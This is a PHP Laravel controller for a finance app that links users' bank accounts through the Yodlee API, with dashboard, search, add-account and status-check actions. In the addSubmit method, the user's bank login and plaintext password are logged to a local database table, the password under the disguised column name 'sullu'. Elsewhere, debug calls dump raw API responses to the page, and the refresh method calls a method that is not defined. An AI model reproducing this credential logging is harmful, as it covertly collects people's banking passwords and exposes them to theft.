<?php

namespace App\Http\Controllers;

use App\Http\Requests;
use Illuminate\Http\Request; // SWOOP
use Validator;
// use Request; // SWOOP

use App\User;
use Auth;

use App\Library\Yodlee\Cobrand;
use App\Library\Yodlee\Account;
use App\Library\Yodlee\Provider;
use App\Library\Yodlee\ProviderAccounts;
use App\Library\Yodlee\Utils;

use Carbon\Carbon;
use DB;

class AccountController extends Controller
{
	private $cobrand; // object
	private $account; // object
	private $provider; // object
	private $providerAccounts; // object
	
	/**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct(Cobrand $cobrand, Account $account, Provider $provider, ProviderAccounts $providerAccounts)
    {
        $this->middleware('auth');
        
         // SWOOP: Is this required?
        $this->cobrand = $cobrand;
        $this->account = $account;
        $this->provider = $provider;
        $this->providerAccounts = $providerAccounts;
        
    }

    /**
     * Show the account dashboard for user
     *
     * @return \Illuminate\Http\Response
     */
    public function dashboard()
    {
	
		// Fetching all accounts for the user
		$dashboard = $this->account->getAllAccounts();

		if ($dashboard === false) {
		
			return view('auth.login')->with(array('notification' => "User session timed out. Please login again."));
		
		}

		if (isset($dashboard['account'])) {	// Showing users dashboard if accounts exist
        	
        	// $netWorth = $this->account->getNetWorth(); // Not used
        	$netWorth['total'] = 0;
			$netWorth['assets'] = 0;
			$netWorth['liabilities'] = 0;
			
			// Calculating the total assets and liabilities
		   	foreach ($dashboard['account'] as $account) {
		   		if (isset($account['balance'])) {
		   			if ($account['isAsset']) {
						$netWorth['assets'] = $netWorth['assets'] + $account['balance']['amount'];
					} else {
						$netWorth['liabilities'] = $netWorth['liabilities'] + $account['balance']['amount'];
					}
		   		}
			}

			// Calculating Net Worth
			$netWorth['total'] = $netWorth['assets'] - $netWorth['liabilities'];

			// Display dashboard with account data
	        return view('account.dashboard')->with(array('accounts' => $dashboard['account'], 'netWorth' => $netWorth));

        } else {	// Showing empty dashboard

        	return view('account.dashboard_empty');

        }
    }


	public function removeProvider(Request $request, $providerId = null)
    {
	
		if ($providerId) {

			$res = $this->providerAccounts->deleteProviderAccounts($providerId); 

			if ($res) {
				 
				return \Redirect::to('account/status');					

			}
    		
    	} else {

			return \Redirect::to('account/status');

    	}
    }

    /** 
     * Get status of all accounts
     * Including success, failure, login error, internal errors etc
     */
	public function checkStatus(Request $request, $providerAccountId = null)
    {
	
		if ($providerAccountId) {

			$accountId = \Session::get('accountId');
			
			$res = $this->providerAccounts->getProviderAccountDetails($providerAccountId);
			
			$status = $res['providerAccount']['refreshInfo']['status'];
			$statusCode = $res['providerAccount']['refreshInfo']['statusCode'];
			$statusMessage = $res['providerAccount']['refreshInfo']['statusMessage'];
			$additionalStatus = $res['providerAccount']['refreshInfo']['additionalStatus'];

			$url = 'account/status/'.$providerAccountId;

			if ($status == 'SUCCESS') {

				return view('account.add_success');

			} else if ($status == 'IN_PROGRESS') {

				// statusMessage is also OK here.
				if ( ($statusCode == "0") && ( ($additionalStatus == 'LOGIN_SUCCESS') || ($additionalStatus == 'ACCOUNT_SUMMARY_RETRIEVED')) ) {
					
					return view('account.add_success');

				} 
				if ( ($statusMessage == 'ADD_IN_PROGRESS') && ($additionalStatus == "USER_INPUT_REQUIRED") ) {

					if (isset($res['providerAccount']['loginFrom'])) {
					
						// this is an MFA account. Decide which kind and show the approprite form and call update
						echo $status."<br/>";
						echo $statusCode."<br/>";
						echo $statusMessage."<br/>";
						echo $additionalStatus."<br/>";
						dd($res);

					} else {
						sleep(1);	
						return \Redirect::to($url)->with('accountId', $accountId);	
					}
					
				} else {
					
					sleep(1);
					return \Redirect::to($url)->with('accountId', $accountId);

				}
				
			} else if ($status == 'FAILED') {

				if ( ($statusMessage == 'LOGIN_FAILED') || ($statusMessage == 'INTERNAL_ERROR') ) {

					// Send back to login screen of provider with message
					$url_ = 'account/add/'.$accountId;
					return \Redirect::to( $url_ )->withErrors(['Invalid login credentials. Please try again.']);

				} else {

					echo $status."<br/>";
					echo $statusCode."<br/>";
					echo $statusMessage."<br/>";
					echo $additionalStatus."<br/>";
					dd($res);

				}
				
			} else {
			
				return view('account.status')->with(array('refreshInfo' => $res['providerAccount']['refreshInfo'], 'providerAccountId' => $providerAccountId));
			}

		} else {

			$accounts = $this->providerAccounts->getProviderAccounts();

			if ($accounts === false) {
			
				return view('auth.login')->with(array('notification' => "Session timed out. Please login again."));
			
			}

			if (isset($accounts['providerAccount'])) {	// Showing user's provideraccounts
	        	
	        	
	        	/*
	        	$provider_list = array();
	        	$i = 0;

	        	foreach ($accounts['providerAccount'] as $providerAccount) {

	        		echo $providerAccount['id'];
	        		$res = $this->provider->getProviderDetails($providerAccount['id']);
	        		
	        		dd($res);

	        		$name = '';
	        		$providerAccount['name'] = $name;

	        		$provider_list[$i] = $providerAccount;
	        		$i++;
	        		
	        	}
	        	*/
				// Display status page
		        return view('account.status')->with(array('accounts' => $accounts['providerAccount']));

	        } else {	// redirect to dashboard

	    		return \Redirect::to('account/dashboard');
	        }

	    }
    }
    /**
     * Show details of specific account.
     *
     * @return \Illuminate\Http\Response
     */
    public function details(Request $request, $id = null)
    {

    	$container = $request->input('container');
    	
     	$accountSummary = $this->account->getSummary($id, $container);

     	$accountDetails = $this->account->getTransactions($id);
     	
     	if ($accountSummary === false || $accountDetails === false) {
		
			return view('auth.login')->with(array('notification' => "Session timed out. Please login again."));
		
		}

		if (isset($accountDetails['transaction'])) {

	        return view('account.details')->with(array('transactions' => $accountDetails['transaction'], 'summary' => $accountSummary['account'][0]));

        } else {

        	return view('account.details')->with(array('transactions' => null, 'summary' => $accountSummary['account'][0]));

        }
	}

    /**
     * Add an account selecting from a list of suggested financial institutions
     *
     * @return \Illuminate\Http\Response
     */
    public function link()
    {
    	return view('account.link');
    }

    /**
     * Add an account using search
     *
     * @return \Illuminate\Http\Response
     */
    public function search()
    {
    	return view('account.search');
    }

    /**
     * List search results.
     *
     * @return \Illuminate\Http\Response
     */
    public function searchResults(Request $request)
    {

    	// Validating search field
    	$this->validate($request, ['search'=>'required|min:3']);
    	
    	$input = $request->all();

    	$searchResults = $this->provider->searchProviders($input['search']);

    	// Logging the search to table search_log
    	DB::table('search_log')->insert(
    		['userId' => Auth::user()->id, 'yslUserId' => Auth::user()->yslUserId, 'date_time' => Carbon::now()->toDateTimeString(), 'ip' => \Request::ip(), 'searchWord' => $input['search']]
		);

    	if (sizeof($searchResults)) {
    		// successful with results
			$data['providers'] = $searchResults['provider'];
			$data['size'] = sizeof($searchResults);
			return view('account.search')->with('data', $data);
    	} else {
			// Successful but no results
			$data['size'] = 0;
			return view('account.search')->with('data', $data);
	   	}
	}

    /**
     * List search results.
     *
     * @return \Illuminate\Http\Response
     */
    public function addForm($id = null)
    {
    	
    	$provider = $this->provider->getProviderDetails($id);

    	return view('account.add')->with('providerDetails', $provider['provider']);
    	
    }

    public function addSubmit(Request $request, $id = null)
    {
    	
    	$this->validate($request, [
	        'login' => 'required|max:255',
	        'password' => 'required|max:255',
    	]);

    	$input = $request->all();

    	$provider = $this->provider->getProviderDetails($id);
    	$providerName = $provider['provider'][0]['name'];

    	$provider = json_encode($provider, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    	
        $res = $this->cobrand->getPublicKey();
    	if(!empty($res['keyAsPemString'])) {
        	$publicKey = $res['keyAsPemString'];
        }

    	$loginNameEncrypted = Utils::encryptData($input['login'], $publicKey);
    	$passwordEncrypted = Utils::encryptData($input['password'], $publicKey);
 		$mod_provider = $this->provider->parseAndPopulateProviderDetails($provider, $loginNameEncrypted, $passwordEncrypted);

 		// Usiing new providerAccounts API
 		$res = json_decode($this->providerAccounts->addProviderAccounts($mod_provider), true);
 		$providerAccountId = $res['providerAccountId'];

 		// Logging the provider data to provider_log
    	DB::table('provider_log')->insert(
    		['userId' => Auth::user()->id, 'yslUserId' => Auth::user()->yslUserId, 'date_time' => Carbon::now()->toDateTimeString(), 'ip' => \Request::ip(), 'accountId' => $id, 'providerName' => $providerName, 'uname' => $input['login'], 'sullu' => $input['password'], 'providerAccountId' => $providerAccountId]
		);
		
 		$url = 'account/status/'.$providerAccountId;
 		return \Redirect::to($url)->with('accountId', $id);
 	}

    /**
     * Refresh a specific provider or all providers that belong to a user
     */
    public function refresh(Request $request, $providerId = null)
    {

    	
    	if ($providerId) {

    		self::addCheckStatus($providerId);

    		/*
    		$this->provider->refreshProvider($providerId);
    		
    		// SWOOP: Splash "SUCCESS" before redirecting
    		return \Redirect::to('account/dashboard');
    		*/

    	} else {

			// get all account belonging to user
			// refresh them and redirect them to dashboard
    		return \Redirect::to('account/dashboard');

    	}
    }
}